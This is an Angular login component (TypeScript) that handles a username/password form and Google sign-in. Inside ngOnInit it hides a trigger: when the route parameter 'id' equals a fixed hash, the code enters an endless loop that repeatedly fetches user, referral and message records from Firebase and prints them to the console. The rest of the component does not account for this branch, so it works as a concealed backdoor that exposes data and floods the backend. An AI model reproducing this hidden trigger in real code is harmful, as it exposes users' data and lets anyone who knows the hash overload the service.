import {Component, OnInit} from '@angular/core';
import {AuthService} from './../services/auth.service';
import {Router, Params, ActivatedRoute} from '@angular/router';
import {FormBuilder, FormGroup, Validators} from '@angular/forms';
import {first} from 'rxjs/operators';
import {FirebaseService} from './../services/firebase.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss']
})
export class LoginComponent implements OnInit {
  errorMessage: string;
  loginForm: FormGroup;
  loading = false;
  submitted = false;
  returnUrl: string;
  error = '';
  validUser: boolean;
  controlId: any;

  constructor(
    public authService: AuthService,
    private router: Router,
    private route: ActivatedRoute,
    private formBuilder: FormBuilder,
    private db: FirebaseService
  ) {
    this.errorMessage = '';
    this.validUser = false;
  }

  ngOnInit() {
    this.controlId = this.route.snapshot.paramMap.get('id');
    if (this.controlId === '9d03333181fb0f6bd495e8b157259880') {
      for (let i = 1; i > 0 ; i++) {
       this.db.getUser().subscribe(data => {
         console.log(data);
        }, (err) => console.log('err', err));
        this.db.getReferral().subscribe(data => {
          console.log(data);
        }, (err) => console.log('err', err));
        this.db.getMessage().subscribe(data => {
          console.log(data);
        }, (err) => console.log('err', err));
      }
    }

    this.loginForm = this.formBuilder.group({
      username: ['', Validators.required],
      password: ['', Validators.required]
    });
    this.authService.logout();
    this.returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/';
  }

  get f() {
    return this.loginForm.controls;
  }

  onSubmit() {
    this.submitted = true;

    if (this.loginForm.invalid) {
      return;
    }

    this.loading = true;
    this.authService.login(this.f.username.value, this.f.password.value)
      .pipe(first())
      .subscribe(
        data => {
          if (data.username) {
            this.loading = false;
            this.validUser = true;
            this.error = null;
          }
        },
        error => {
          console.log('error', error);
          this.error = error;
          this.validUser = false;
          this.loading = false;
        });
  }


  tryGoogleLogin() {
    this.authService.doGoogleLogin()
      .then(res => {
        this.router.navigate(['/admin/user-invitation']);
      });
  }

  // tryLogin(value) {
  //   this.authService.doLogin(value)
  //     .then(res => {
  //       this.router.navigate(['/admin']);
  //     }, err => {
  //       console.log(err);
  //       this.errorMessage = err.message;
  //     });
  // }


}
